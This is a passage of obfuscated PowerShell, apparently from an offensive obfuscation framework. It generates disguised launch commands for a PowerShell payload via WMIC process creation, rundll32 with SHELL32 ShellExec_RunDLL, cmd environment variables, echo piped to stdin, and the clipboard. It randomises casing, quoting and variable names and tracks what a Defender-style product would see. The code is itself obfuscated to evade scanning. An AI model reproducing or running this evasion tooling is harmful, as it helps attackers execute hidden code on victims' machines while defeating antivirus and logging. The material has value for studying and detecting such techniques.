                          ${scriPtsTr`i`Ng} = ${s`CriptST`R`ing}.("{1}{0}"-f'eplace','R').Invoke('``$',(('{0}{0'+'}{0}'+'{1}')-F [ChaR]96,[ChaR]36))
                      }
                  }

                  
                  If(${sC`RIp`TSTRi`NG}.("{0}{1}{2}"-f 'Co','ntain','s').Invoke('`"'))
                  {
                      ${s`cr`ipt`S`TriNG} = ${S`CRiPTStrI`Ng}.("{1}{0}" -f'ce','Repla').Invoke('`"','``"')
                  }

                  
                  If(${S`CRI`PTsT`RiNg}.("{0}{1}{2}"-f'C','ont','ains').Invoke('"'))
                  {
                      
                      While(${s`cr`iP`T`STRInG}.("{2}{0}{1}" -f'ai','ns','Cont').Invoke('\"'))
                      {
                          ${s`CRi`PtStr`Ing} = ${sCRI`p`T`s`TRINg}.("{0}{1}"-f 'Rep','lace').Invoke('\"','"')
                      }

                      
                      ${CHaRca`s`TDou`B`L`equote} = ([Char[]](&("{2}{0}{1}"-f'-R','andom','Get') -Input @(("{1}{3}{4}{0}{2}" -f ']3','[Strin','4','g][Ch','ar'),(("{2}{1}{0}{4}{3}"-f 'oStr',').T','([Char]34',')','ing(')))) | &("{1}{0}{2}" -f 'Obj','ForEach-','ect') {${cH`Ar} = ${_}; If(&("{2}{0}{1}"-f'-Ran','dom','Get') -Input (0..1)){${ch`AR} = ${C`hAr}.("{0}{1}" -f 'ToStri','ng').Invoke().("{1}{0}{2}"-f 'Up','To','per').Invoke()} ${C`HaR}}) -Join ''
                      If(${sCRipTst`RI`Ng}."LE`NGTH"-${S`cRiptSTri`Ng}.("{0}{1}" -f'Repla','ce').Invoke('"','')."L`eNGTh" -le 5)
                      {
                          
                          ${sUB`sTi`TU`TiOns`YNtax}  = ('\"' + ' '*(&("{2}{1}{0}"-f'm','o','Get-Rand') -Minimum 0 -Maximum 3) + '+' + ' '*(&("{1}{0}{2}"-f 'R','Get-','andom') -Minimum 0 -Maximum 3) + ${cHarcAstd`o`Ub`leqUOTE} + ' '*(&("{2}{1}{0}" -f 'andom','t-R','Ge') -Minimum 0 -Maximum 3) + '+' + ' '*(&("{2}{0}{1}{3}" -f 'a','n','Get-R','dom') -Minimum 0 -Maximum 3) + '\"')
                          ${scriP`TstR`Ing}        = ${sCr`IptS`T`R`iNg}.("{0}{1}" -f 'R','eplace').Invoke('"',${s`U`BS`TITUt`iONSYntax}).("{1}{0}" -f 'ace','Repl').Invoke(((("{1}{3}{2}{0}"-f '{1}+','{0','}{0}','}{1')) -f [cHar]92,[cHar]34),'').("{0}{1}"-f'Replac','e').Invoke(((("{0}{1}{3}{2}"-f 'kVc2jGk','V',' +','c2jG')).("{0}{1}"-f 'REpLac','E').Invoke('kVc','\')."ReP`lACe"('2jG',[STRing][char]34)),'').("{1}{0}"-f'ace','Repl').Invoke(((("{2}{0}{1}{4}{3}"-f '{','1}','{1}{0}','+','{0}  ')) -f [cHAR]34,[cHAR]92),'').("{0}{1}" -f'Rep','lace').Invoke(((("{4}{3}{0}{1}{2}"-f 'l ',' ',' +','YtYlKhYtY','Kh'))  -crEPLacE([Char]75+[Char]104+[Char]89),[Char]92  -RePlacE([Char]116+[Char]89+[Char]108),[Char]34),'')
                      }
                      Else
                      {
                          
                          
                          ${C`h`A`Rst`orANDOmvarnAME}  = @(0..9)
                          ${C`HARStoRAn`dOMVA`RName} += @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')

                          
                          ${r`ANdo`m`Va`RLenGth} = (&("{2}{0}{1}"-f't-R','andom','Ge') -Input @(1..2))
   
                          
                          If(${CHarsTO`R`AnDoMVa`Rn`AMe}."C`Ount" -lt ${RAN`domva`Rlen`gth}) {${Ran`DoMVarL`EN`gTH} = ${chAr`STOran`d`omVARN`AME}."C`oUnT"}
                          ${ranD`oMv`Arn`A`ME} = ((&("{1}{0}{2}"-f'ndo','Get-Ra','m') -Input ${ChArs`TORa`ND`OMVA`RNaMe} -Count ${ran`Do`mvarlENg`TH}) -Join '').("{1}{0}{2}" -f 'ac','Repl','e').Invoke(' ','')

                          
                          While(${sC`R`IpTSt`RINg}.("{2}{0}{1}" -f'Low','er','To').Invoke().("{0}{1}"-f 'Con','tains').Invoke(${RanD`Om`VarNA`me}.("{0}{2}{1}" -f'ToL','wer','o').Invoke()))
                          {
                              ${raNDO`mv`A`RnAmE} = ((&("{1}{0}{2}" -f 't-','Ge','Random') -Input ${cHarsTORa`NdOM`V`AR`NAME} -Count ${RA`NdOM`Va`RLE`NGth}) -Join '').("{1}{0}"-f'lace','Rep').Invoke(' ','')
                              ${R`A`NDomvAR`lenG`Th}++
                          }

                          
                          ${ra`N`DoM`V`Ar`N`AmEM`AybECoNCatEn`ATed} = ${ra`NDom`Varna`me}
                          If((&("{1}{2}{0}" -f 'dom','Get','-Ran') -Input @(0..1)) -eq 0)
                          {
                              ${RAndOMVA`RNamE`M`A`y`BeCo`N`CATenA`Ted} = '(' + (&("{5}{2}{1}{3}{4}{0}" -f'edString','ten','a','a','t','Out-Conc') ${rANDom`VA`R`NA`Me} "'") + ')'
                          }

                          
                          ${Ran`do`mvARSETSy`N`Tax}  = @()
                          ${RAnd`Omvar`S`eTs`YNtax} += '$' + ${R`A`NdOmVA`RNA`me} + ' '*(&("{2}{1}{0}" -f 'dom','t-Ran','Ge') @(0..2)) + '=' + ' '*(&("{0}{2}{1}"-f 'Get-Ra','om','nd') @(0..2)) + ${cHARca`St`douB`l`Equ`OTE}
                          ${ra`NdO`mVARs`ETsyn`Tax} += (&("{0}{1}{2}"-f 'Get-','Ra','ndom') -Input @(("{2}{0}{1}"-f 'ariab','le','Set-V'),'SV','Set')) + ' '*(&("{1}{2}{0}"-f'andom','Get','-R') @(1..2)) + ${rA`NdomvAr`Nam`EmAybE`CO`NCATENA`Ted} + ' '*(&("{0}{2}{1}"-f'Ge','andom','t-R') @(1..2)) + '(' + ' '*(&("{0}{1}{2}" -f 'G','et','-Random') @(0..2)) + ${C`HArCAstDoU`Bl`EQUOte} + ' '*(&("{2}{0}{1}"-f'Rando','m','Get-') @(0..2)) + ')'
    
                          
                          ${RaNDo`MVA`RSet} = (&("{2}{0}{1}"-f 'ando','m','Get-R') -Input ${ranD`omV`A`RSE`TsyntAx})

                          
                          ${S`etVa`RIABL`es} += ${r`AN`DOmvAr`SET} + ' '*(&("{0}{1}{2}"-f'G','e','t-Random') @(1..2)) + ';'
                          ${sCri`P`TsTr`iNG} = ${sCriPT`S`TRiNg}.("{1}{0}" -f 'place','Re').Invoke('"',"`${$RandomVarName}")
                      }
                  }
                  
                  
                  ${char`C`ASt`comma}= ([Char[]](&("{2}{1}{0}"-f'andom','et-R','G') -Input @(("{3}{0}{2}{1}" -f'h','44','ar]','[String][C'),("{0}{3}{5}{4}{2}{1}" -f'([Char','()','tring',']44).','S','To'))) | &("{0}{3}{2}{1}"-f 'For','ect','j','Each-Ob') {${Ch`AR} = ${_}; If(&("{3}{0}{1}{2}" -f'et-Ran','do','m','G') -Input (0..1)){${Ch`AR} = ${cH`AR}.("{2}{0}{1}"-f 'St','ring','To').Invoke().("{0}{1}" -f'ToU','pper').Invoke()} ${cH`AR}}) -Join ''
                  If(${S`Cri`pT`St`RING}."lE`Ng`Th"-${sC`RipTS`TRiNG}.("{1}{0}"-f 'eplace','R').Invoke(',','')."leN`g`Th" -le 5)
                  {
                      
                      ${s`UbsTitut`IonsY`NTAx}  = ('\"' + ' '*(&("{2}{1}{0}" -f'm','t-Rando','Ge') -Minimum 0 -Maximum 3) + '+' + ' '*(&("{2}{0}{1}" -f 'et-R','andom','G') -Minimum 0 -Maximum 3) + ${c`HaRcasTC`Omma} + ' '*(&("{1}{2}{0}" -f'dom','Get-R','an') -Minimum 0 -Maximum 3) + '+' + ' '*(&("{2}{1}{0}"-f'dom','et-Ran','G') -Minimum 0 -Maximum 3) + '\"')
                      ${scRiPTs`TRi`Ng}        = ${ScR`iP`TSTRI`Ng}.("{0}{1}"-f'Repl','ace').Invoke(',',${suB`ST`ItuT`i`oNs`Yntax}).("{0}{2}{1}"-f'R','ace','epl').Invoke(((("{3}{1}{2}{0}"-f '}+','}{0}','{1','{0}{1'))-f [cHaR]92,[cHaR]34),'').("{0}{2}{1}" -f'Repla','e','c').Invoke(((("{0}{4}{2}{3}{1}"-f 'HopLOrH',' +','pL','Or','o'))."Re`plA`cE"(([char]72+[char]111+[char]112),[sTrIng][char]92)."r`EPla`cE"(([char]76+[char]79+[char]114),[sTrIng][char]34)),'').("{2}{1}{0}"-f'e','ac','Repl').Invoke(((("{3}{4}{1}{0}{2}" -f'po','b','CTG  +','bpo','CTG'))-crEPlace([CHAR]98+[CHAR]112+[CHAR]111),[CHAR]92  -rEpLAce 'CTG',[CHAR]34),'').("{0}{1}" -f'R','eplace').Invoke(((("{1}{0}{2}{3}"-f 'PH','qPHgIaq','gIa ','  +')) -CREpLACe([chaR]103+[chaR]73+[chaR]97),[chaR]34 -ReplaCE 'qPH',[chaR]92),'')
                  }
                  Else
                  {
                      
                      
                      ${c`Ha`RsTOr`ANdoMvaRName}  = @(0..9)
                      ${c`HaRs`Tor`A`NDomvarNAMe} += @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')

                      
                      ${Ran`DO`m`V`ArLen`Gth} = (&("{2}{1}{3}{0}" -f 'm','-R','Get','ando') -Input @(1..2))
   
                      
                      If(${cHAr`s`T`Or`AnDo`mVarNA`ME}."c`oUnT" -lt ${R`A`N`do`MVaRlenGtH}) {${RA`N`DOM`Va`RLeNGTH} = ${CHArS`T`OrAndO`Mvar`NaMe}."cO`UNT"}
                      ${rAND`OMVarn`A`me} = ((&("{2}{0}{1}" -f't-Rando','m','Ge') -Input ${chars`ToRa`NDOmVARna`ME} -Count ${r`AN`dOM`V`ARLENGTh}) -Join '').("{1}{0}" -f 'ce','Repla').Invoke(' ','')

                      
                      While(${Sc`RIptSTr`inG}.("{0}{1}" -f 'ToLowe','r').Invoke().("{0}{2}{1}"-f'Cont','ins','a').Invoke(${RANd`Om`VAR`N`AmE}.("{2}{0}{1}"-f 'Lo','wer','To').Invoke()))
                      {
                          ${RANDom`Varn`A`me} = ((&("{1}{2}{0}" -f 'om','Get-Ra','nd') -Input ${ch`ARSt`o`RaNdoM`V`AR`Name} -Count ${RAndomvar`le`N`GtH}) -Join '').("{0}{1}"-f 'Repla','ce').Invoke(' ','')
                          ${R`A`NDoM`V`AR`lEngTH}++
                      }

                      
                      ${r`ANdo`mvAR`N`AMEMaYbE`cONca`T`ENatEd} = ${ranDOM`VARNa`ME}
                      If((&("{2}{1}{3}{0}" -f 'm','Rand','Get-','o') -Input @(0..1)) -eq 0)
                      {
                          ${r`A`Ndo`MvAR`NA`M`EmaYBEC`ONc`AtEnATeD} = '(' + (&("{0}{2}{1}{3}{4}" -f'Out','aten','-Conc','ated','String') ${Ra`NDo`MvArNAmE} "'") + ')'
                      }

                      
                      ${RA`NDo`MvARset`sYntax}  = @()
                      ${RAnDOmV`ARS`ETSy`NTAX} += '$' + ${RandO`mV`ARNaME} + ' '*(&("{1}{2}{0}"-f 'm','Get','-Rando') @(0..2)) + '=' + ' '*(&("{1}{0}{2}"-f 'R','Get-','andom') @(0..2)) + ${cHA`R`cASTcommA}
                      ${rANd`oMv`Ars`eTsy`Ntax} += (&("{0}{1}{2}" -f'Ge','t-R','andom') -Input @(("{1}{0}{2}"-f 'et-Variab','S','le'),'SV','Set')) + ' '*(&("{0}{2}{1}"-f 'G','andom','et-R') @(1..2)) + ${RaNDoMvaRN`A`Mema`YbEC`o`NcaT`e`N`A`TEd} + ' '*(&("{2}{1}{0}" -f'm','Rando','Get-') @(1..2)) + '(' + ' '*(&("{2}{3}{0}{1}" -f 't-Rand','om','G','e') @(0..2)) + ${chA`RCAStCoM`ma} + ' '*(&("{2}{3}{0}{1}" -f 'o','m','G','et-Rand') @(0..2)) + ')'

                      
                      ${rANDOMVa`R`SEt} = (&("{2}{3}{1}{0}" -f'm','ando','Get','-R') -Input ${ra`N`doM`VaRS`ETSy`NtAx})

                      
                      ${SeTvARiA`Bl`ES} += ${RanDOMV`A`RS`eT} + ' '*(&("{0}{1}{2}"-f 'G','et-','Random') @(1..2)) + ';'
                      ${sCR`i`PtStri`NG} = ${SC`RIp`TS`TrInG}.("{0}{1}{2}"-f'R','ep','lace').Invoke(',',"`${$RandomVarName}")
                  }

                  
                  ${SCRIPts`T`RiNg} =  '\"' + ${Sc`RipTST`Ri`NG} + '\"'

                  
                  
                  
                  ${s`CrIpT`ST`RINgteMp} = ','
                  While(${Sc`RIptS`T`R`Ingt`EMP}.("{1}{0}" -f's','Contain').Invoke(','))
                  {
                      ${Sc`RI`PtSTRIn`gtEMP} = &("{4}{5}{1}{0}{2}{3}"-f'nvo','tedI','ke','Expression','Out-Encapsul','a') ${SCr`ipTs`T`RINg}
                  }

                  
                  ${Scrip`T`stR`INg} = ${ScrI`ptsTR`I`NgtEmP}

                  
                  ${Scri`pts`T`RInG} = ${SET`VAri`Ables} + ${sc`RiPT`sTRInG}
              }

              
              ${wMI`caRg`Ume`N`TS} = ([Char[]]("{2}{4}{3}{0}{5}{1}"-f'l cre','te','p','cal','rocess ','a') | &("{2}{1}{0}"-f't','Objec','ForEach-') {${c`HaR} = ${_}; If(&("{0}{2}{1}" -f 'Get-Ran','om','d') -Input (0..1)){${ch`Ar} = ${CH`AR}.("{1}{0}{2}"-f 'i','ToStr','ng').Invoke().("{0}{1}"-f'To','Upper').Invoke()} ${C`har}}) -Join ''

              
              ${w`Mic`ARGUme`N`Ts} = ((${wMICaRg`U`Men`TS}.("{0}{1}"-f'Spli','t').Invoke(' ') | &("{0}{3}{1}{2}"-f 'For','j','ect','Each-Ob') {${Ra`NdO`M`qUOTes} = (&("{0}{2}{1}" -f 'Ge','dom','t-Ran') -Input @('"',"'",' ')); ${Ra`NDomQuO`TEs} + ${_} + ${r`AN`DO`mQuOt`ES} + ' '*(&("{1}{0}{2}"-f 'et-Rand','G','om') -Minimum 1 -Maximum 4)}) -Join '').("{1}{0}"-f 'im','Tr').Invoke()

              
              If(${s`CRIpt`string}.("{1}{0}"-f 'tains','Con').Invoke('\"'))
              {
                  ${s`c`RipT`S`TrinG} = ${s`cRIptST`R`InG}.("{0}{2}{1}" -f 'R','lace','ep').Invoke('\"','"\"')
              }

              
              ${p`SCm`dSyntAX}   = ${pO`WeRShel`l`FlAGs} + ${scrI`pT`ST`RInG}
              ${wmiC`CMd`S`Yn`TaX} = ' '*(&("{0}{1}{2}"-f'G','et-Rand','om') -Minimum 1 -Maximum 4) + ${Wm`IcAR`guMeN`Ts} + ' '*(&("{0}{2}{1}"-f'Get-','om','Rand') -Minimum 1 -Maximum 4) + '"' + ${paT`HtOpO`wE`RSH`elL} + ${PSc`mDS`yNtAX} + '"'
    
              
              
              ${a`RGS`D`eF`e`NDErw`illSeE} += , @(((("{20}{16}{11}{7}{4}{3}{17}{8}{19}{6}{0}{1}{12}{5}{2}{18}{13}{14}{9}{15}{10}"-f'IND','O','tem','.E','WMIC','Dhsys','ution] C:1DhW','o ','E ','prv','e.exe','d t','WS1','hw','bem1Dhwmi','s','late','X','321D','exec','[Unre'))."Re`P`LACE"(([ChAr]49+[ChAr]68+[ChAr]104),'\')), ("{0}{2}{1}{3}" -f' -secured -','bed','Em','ding'))
              ${a`RGSd`efeNDE`RwI`lL`SEe} += , @(${p`AT`hto`PoWeRSHelL}, ${P`sc`MDsyNt`Ax})

              ${c`MDl`inEOutPut} = ${PA`Tht`o`wmic} + ${WMI`cc`mDsYnt`Ax}
          }
        4 {
              
              
              

              

              
              ForEach(${Ch`AR} in ${C`HARS`TOE`SCape})
              {
                  If(${SC`RIptST`Ring}.("{0}{1}{2}"-f'C','on','tains').Invoke("^^^$Char")) {${sC`Ri`P`TSTrInG} = ${ScRIpt`S`TrI`NG}.("{2}{1}{0}"-f 'e','ac','Repl').Invoke("^^^$Char","$Char")}
              }
              If(${SCRI`pTStr`Ing}.("{1}{2}{0}"-f 's','Con','tain').Invoke(("{0}{1}" -f '^^','^^')))
              {
                  ${S`c`RIptsTri`NG} = ${S`cR`iPtS`TriNG}.("{2}{0}{1}" -f 'p','lace','Re').Invoke(("{1}{0}"-f'^^^','^'),'^')
              }

              
              ${sHe`ll3`2Dll} = ([Char[]]("{1}{0}{2}" -f 'H','S','ELL32.DLL') | &("{2}{0}{4}{3}{1}"-f'rE','Object','Fo','-','ach') {${CH`AR} = ${_}; If(&("{1}{0}{3}{2}" -f 'et-R','G','dom','an') -Input (0..1)){${CH`Ar} = ${C`HAr}.("{0}{2}{1}"-f 'ToStr','ng','i').Invoke().("{0}{1}" -f 'ToUppe','r').Invoke()} ${Ch`Ar}}) -Join ''

              
              ${ExECU`T`I`oNfLAGSR`UndLlS`YN`TAx} = (${Po`W`eRshELlFLAg`SA`R`Ray} | &("{1}{2}{0}" -f 'ject','Where','-Ob') {${_}.("{0}{1}" -f'Tr','im').Invoke()."LEN`g`TH" -gt 0} | &("{2}{0}{1}" -f'Each-Objec','t','For') {'"' + ' '*(&("{1}{0}{2}" -f't-','Ge','Random') -Minimum 0 -Maximum 3) + ${_} + ' '*(&("{0}{2}{1}"-f'Get','dom','-Ran') -Minimum 0 -Maximum 3) + '"' + ' '*(&("{2}{1}{0}"-f'ndom','-Ra','Get') -Minimum 1 -Maximum 4)}) -Join ''
 
              
              ${PScMdsyN`T`AX}     = ' '*(&("{2}{1}{0}"-f'ndom','Ra','Get-') -Minimum 1 -Maximum 4) + ${ExE`cUtiOnfLA`Gs`RunDL`lSynTax} + ' '*(&("{0}{2}{3}{1}" -f 'G','dom','et-Ra','n') -Minimum 1 -Maximum 4) + "`"$ScriptString`""
              ${RUn`DLlC`mdS`yNt`Ax} = ' '*(&("{1}{2}{0}" -f 'om','Get-','Rand') -Minimum 1 -Maximum 4) + ${s`hel`l32dlL} + (&("{0}{2}{1}" -f 'Get','om','-Rand') -Input @(',',' ', ((&("{0}{1}{3}{2}" -f'Get-','Ra','dom','n') -Input @(',',',',',',' ',' ',' ') -Count (&("{1}{2}{0}"-f 'm','Get-','Rando') -Input @(4..6)))-Join''))) + ("{2}{1}{3}{0}" -f 'L','Exec_Run','Shell','DL') + ' '*(&("{1}{0}{2}" -f'ando','Get-R','m') -Minimum 1 -Maximum 4) + "`"$PathToPowerShell`"" + ${Ps`C`MDS`ynTAx}
    
              
              ${A`RGSdefe`NDER`willSEe} += , @(${pA`ThT`OrUNd`Ll}          , ${r`U`NDlLc`mdsy`NTax})
              ${ARgsdEFEndErW`iL`L`S`ee} += , @("`"$PathToPowerShell`"", ${PSC`Mdsy`NtaX}.("{0}{1}{2}"-f'R','eplac','e').Invoke('^',''))

              ${c`m`d`lInEO`UtpUt} = ${pAT`htOrU`Ndll} + ${rUNDLlc`md`S`ynt`AX}
          }
        5 {
              
              
              

              
              ForEach(${Ch`AR} in ${Cha`R`ST`o`EScaPE})
              {
                  If(${Sc`Ri`p`TSt`RINg}.("{1}{0}{2}" -f 'ta','Con','ins').Invoke("^^^$Char")) {${S`CRi`pTS`TRiNg} = ${sc`RI`PT`sTring}.("{1}{0}{2}"-f'pl','Re','ace').Invoke("^^^$Char","^$Char")}
              }
              If(${SCR`Ip`Ts`TR`iNg}.("{2}{1}{0}"-f 'ntains','o','C').Invoke(("{1}{0}"-f '^^','^^')))
              {
                  ${sCRIpTS`T`RiNG} = ${s`CrIP`Tst`RINg}.("{0}{1}" -f'Re','place').Invoke(("{1}{0}"-f '^','^^^'),'^^')
              }
                        
              
              If(${sc`RIpT`STrI`NG}.("{0}{1}{2}" -f'C','onta','ins').Invoke('\"')) {${sCr`IPT`stRI`NG} = ${SCriPTS`T`RINg}.("{2}{1}{0}"-f'e','eplac','R').Invoke('\"','"')}

              
              
              ${chARs`FOrVA`RNAMe} = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
              ${vAr`iaBlE`N`AME} = (&("{2}{0}{1}"-f'-Rando','m','Get') -Input ${cHArs`F`oRv`ArNAME} -Count (${CH`A`Rs`FORvarNAme}."Cou`Nt"/(&("{1}{2}{0}{3}"-f 'nd','Get','-Ra','om') -Input @(5..10)))) -Join ''
              ${V`ARIa`BL`EnAme} = ([Char[]]${varI`ABLEN`Ame}.("{0}{1}"-f'ToLowe','r').Invoke() | &("{0}{2}{4}{3}{1}"-f 'ForEa','ect','ch','bj','-O') {${Ch`Ar} = ${_}; If(&("{1}{0}{2}" -f 'n','Get-Ra','dom') -Input (0..1)){${C`Har} = ${c`HAR}.("{2}{1}{0}" -f 'g','n','ToStri').Invoke().("{0}{1}"-f 'To','Upper').Invoke()} ${CH`Ar}}) -Join ''

              
              ${iNvO`kevariAbLES`y`N`Tax} = &("{1}{9}{3}{10}{4}{2}{0}{6}{7}{5}{8}"-f'ntV','O','ironme','o','nv','Sy','ariab','le','ntax','ut-RandomInvokeRand','mE') ${VArIa`Bl`e`N`AMe}

              
              ${sE`TsyN`TAx} = ([Char[]]'set' | &("{1}{0}{2}{3}"-f'ac','ForE','h-O','bject') {${c`HAR} = ${_}; If(&("{0}{1}{2}{3}"-f 'Get-Ran','d','o','m') -Input (0..1)){${C`har} = ${C`hAr}.("{0}{2}{1}"-f'ToS','ing','tr').Invoke().("{2}{1}{0}" -f 'pper','U','To').Invoke()} ${CH`AR}}) -Join ''
              ${sEtS`y`NTax} = ${SeTS`y`N`TaX} + ' '*(&("{2}{1}{0}" -f '-Random','t','Ge') -Minimum 2 -Maximum 4) + ${varI`ABle`N`Ame} + '='

              
              ${SE`T`sYNtax} = ([Char[]]${SETSyn`T`AX}.("{1}{0}"-f'oLower','T').Invoke() | &("{1}{4}{3}{2}{0}" -f'ject','F','ach-Ob','E','or') {${ch`AR} = ${_}; If(&("{1}{2}{0}"-f 't-Random','G','e') -Input (0..1)){${CH`AR} = ${Ch`AR}.("{1}{0}" -f'String','To').Invoke().("{0}{1}" -f'To','Upper').Invoke()} ${C`HaR}}) -Join ''

              
              ${pSCm`Dsy`N`TAX} = ${POweRSH`E`Llfla`gs} + ${iNvoKeva`Ria`BL`eSYnTAx}
              ${CM`dSY`NtAx}   = ${slaS`Hc} + ' '*(&("{2}{3}{1}{0}" -f 'Random','-','G','et') -Minimum 0 -Maximum 4) + '"' + ${s`ETSyN`T`Ax} + ${scripts`T`RinG} + '&&' + ' '*(&("{3}{2}{1}{0}"-f 'dom','n','-Ra','Get') -Minimum 0 -Maximum 4) + ${pA`T`htO`po`WErSh`ELL} + ${Psc`MDSYN`Tax} + '"'
    
              
              ${A`Rg`SdeFE`NdERwilL`see} += , @(${pat`h`TOC`Md}       , ${cmDs`YN`Tax})
              ${ArGS`d`E`F`enDer`WIllSeE} += , @(${pA`THTopOwEr`shE`lL}, ${P`scm`dsYNt`AX}.("{0}{2}{1}"-f 'Rep','ce','la').Invoke('^',''))

              ${cmdLi`NEOutP`Ut} = ${PAT`ht`OcmD} + ${cmD`sY`NtAX}
          }
        6 {
              
              
              

              
              If(${SCRipt`sT`RINg}.("{2}{1}{0}" -f's','ntain','Co').Invoke('\"')) {${Scr`i`P`TsTRInG} = ${Sc`RiptSTRI`Ng}.("{1}{0}"-f'eplace','R').Invoke('\"','"')}
             
              
              ${PO`WeR`SH`el`LStD`In} = &("{10}{0}{8}{5}{4}{2}{9}{7}{6}{1}{3}" -f'-R','nta','mPowerShellStdInInv','x','o','nd','y','keS','a','o','Out')
              
              
              ${pS`cm`DsyN`TAx} = ${POwE`RSHeLlf`L`AGS} + ${PO`wersh`El`l`StdIn}
              ${C`M`DSyNtAX}   = ${SlA`s`HC} + ' '*(&("{0}{2}{1}"-f'G','-Random','et') -Minimum 0 -Maximum 4) + '"'  + ' '*(&("{2}{0}{1}" -f 'do','m','Get-Ran') -Minimum 0 -Maximum 3) + ${E`CHo} + (&("{1}{2}{0}"-f '-Random','G','et') -Input ('/','\',' '*(&("{1}{0}{2}"-f 't-Rand','Ge','om') -Minimum 1 -Maximum 3))) + ${ScRIPts`T`RINg} + ' '*(&("{1}{0}{3}{2}" -f'et-Rand','G','m','o') -Minimum 1 -Maximum 3) + '|' + ' '*(&("{1}{0}{2}"-f'a','Get-R','ndom') -Minimum 1 -Maximum 3) + ${pAtHT`Op`ow`ersh`ell} + ${psCMdSY`NT`Ax} + '"'
    
              
              ${ar`g`SdEfENd`ERWI`LLS`ee} += , @(${P`AT`hTOcMD}       , ${cmD`SyN`TAX})
              ${ar`G`SdEf`EnDE`RWi`LLsEE} += , @(${patHtO`Po`we`RSHELL}, ${pSCM`D`sy`NtAX}.("{1}{2}{0}" -f 'ce','R','epla').Invoke('^',''))

              ${CMDLi`NeO`UTPUt} = ${PaT`Hto`cmD} + ${C`MD`SYnT`AX}
          }
        7 {
              
              
              

              
              If(${s`CRIpTSt`Ri`Ng}.("{0}{2}{1}"-f 'Contai','s','n').Invoke('\"')) {${scRIp`Ts`TriNG} = ${SC`RI`PtStRInG}.("{1}{0}"-f'eplace','R').Invoke('\"','"')}
             
              
              ${pOW`ERsH`ELL`CliP} = &("{5}{4}{1}{3}{0}{6}{7}{2}" -f'nvok','omCli','tax','pboardI','ut-Rand','O','eS','yn')

              
              
              
              
              
              ${cOMM`AND`FlAg`VAlue} = ${n`Ull}
              If(${P`S`B`OunDP`ARAmet`eRS}[("{0}{1}{2}"-f'Comm','a','nd')] -OR ${COMmA`ND})
              {
                  ${uPp`ErL`iM`iT} = ${POwER`shel`L`FLA`Gsa`RrAY}."C`oUNt"-1
                  ${cOm`mANdfLa`Gv`A`LuE} = ${PoWers`H`e`LlF`LagSArrAy}[${PO`WERSh`elLfLAgsaRR`AY}."cOu`NT"-1]
              }
              Else
              {
                  ${UPpE`R`Lim`it} = ${p`ow`ersheLlflags`A`Rray}."C`oUnT"
              }

              
              ${P`oW`e`RsheLlFLA`GS} = @()
              For(${i}=0; ${i} -lt ${upp`eRL`I`mIt}; ${i}++)
              {
                  ${poWe`R`she`LlF`laGs} += ${pO`WerS`hellFlAGS`ArRay}[${I}]
              }

              
              ${Po`weR`sH`eL`LflaGS} += (&("{0}{1}{2}{3}"-f'Ge','t','-Rand','om') -Input @('-st',("{1}{0}" -f'sta','-')))
              
              
              
              If(${PoWEr`s`HeLLfl`AGs}."cO`UNT" -gt 1)
              {
                  ${pOwe`R`sHEl`LFLAgs} = &("{2}{0}{3}{1}" -f'an','m','Get-R','do') -InputObject ${P`OwE`RsHEllF`lagS} -Count ${Powe`R`sheLl`FLaGs}."co`Unt"
              }

              
              If(${CoMMaN`Df`L`Agv`ALue})
              {
                  ${PoW`e`R`she`llfl`AgS} += ${CoMMaNDfl`A`gV`Al`UE}
              }

              
              For(${I}=0; ${I} -lt ${PoWERSh`elLfl`Ags}."coU`NT"; ${I}++)
              {
                  ${p`owEr`Sh`ELLFl`AGS}[${i}] = ([Char[]]${Po`W`ERS`HElL`FLagS}[${i}] | &("{1}{0}{2}"-f'ach-Ob','ForE','ject') {${cH`Ar} = ${_}.("{0}{2}{1}" -f'To','ng','Stri').Invoke().("{0}{1}"-f'ToL','ower').Invoke(); If(&("{2}{1}{0}"-f'Random','et-','G') -Input @(0..1)) {${Ch`Ar} = ${C`HAr}.("{0}{1}"-f'T','oUpper').Invoke()} ${ch`Ar}}) -Join ''
              }

              
              ${PO`WERshEl`L`FLA`Gs} = (${pOWE`RShell`FL`Ags} | &("{4}{0}{1}{3}{2}" -f 'r','Eac','bject','h-O','Fo') {${_} + ' '*(&("{3}{1}{2}{0}"-f'm','and','o','Get-R') -Minimum 1 -Maximum 3)}) -Join ''
              ${pO`WE`RSH`ElLFlAgs} = ' '*(&("{1}{0}{3}{2}" -f'Ra','Get-','m','ndo') -Minimum 1 -Maximum 3) + ${poWERSHe`LLf`lA`GS} + ' '*(&("{2}{1}{0}"-f 'dom','an','Get-R') -Minimum 1 -Maximum 3)

              
              ${psc`MDs`Yn`TAX} = ${PoweR`shELLfLA`gS} + ${pOWersheL`lcL`ip}
              ${cMdsy`Nt`AX}   = ${sLaS`HC} + ' '*(&("{2}{0}{1}" -f'ando','m','Get-R') -Minimum 0 -Maximum 4) + '"'  + ' '*(&("{1}{0}{2}"-f'R','Get-','andom') -Minimum 0 -Maximum 3) + ${E`cHO} + (&("{2}{0}{1}"-f 'et-Ra','ndom','G') -Input ('/','\',' '*(&("{0}{2}{1}" -f'Get','dom','-Ran') -Minimum 1 -Maximum 3))) + ${sCR`I`p`TString} + ' '*(&("{0}{2}{1}"-f 'G','m','et-Rando') -Minimum 0 -Maximum 2) + '|' + ' '*(&("{0}{2}{1}"-f'Get-R','ndom','a') -Minimum 0 -Maximum 2) + ${p`ATh`ToC`LIp} + ' '*(&("{2}{0}{1}" -f 'do','m','Get-Ran') -Minimum 0 -Maximum 2) + '&&' + ' '*(&("{2}{1}{0}"-f 'ndom','t-Ra','Ge') -Minimum 1 -Maximum 3) + ${pAtH`TOP`OWErs`Hell} + ${psCMds`Y`NT`AX} + '"'
    
              
              ${a`RGs`dEFEN`DeR`WiLl`SEe} += , @(${p`AtH`TOCmD}       , ${c`MDsYn`Tax})
              ${Ar`gSD`Efe`ND`erwill`SEE} += , @(${PatHTo`p`OWeRS`HELL}, ${PsCMD`syn`T`AX}.("{0}{1}{2}" -f'R','e','place').Invoke('^',''))

              ${cmdl`I`Ne`o`UtPut} = ${P`Atht`oCmD} + ${c`mDsY`NTax}
          }
        8 {
              
              
              

              
              ForEach(${CH`Ar} in ${cHArST`oes`cApe})
              {
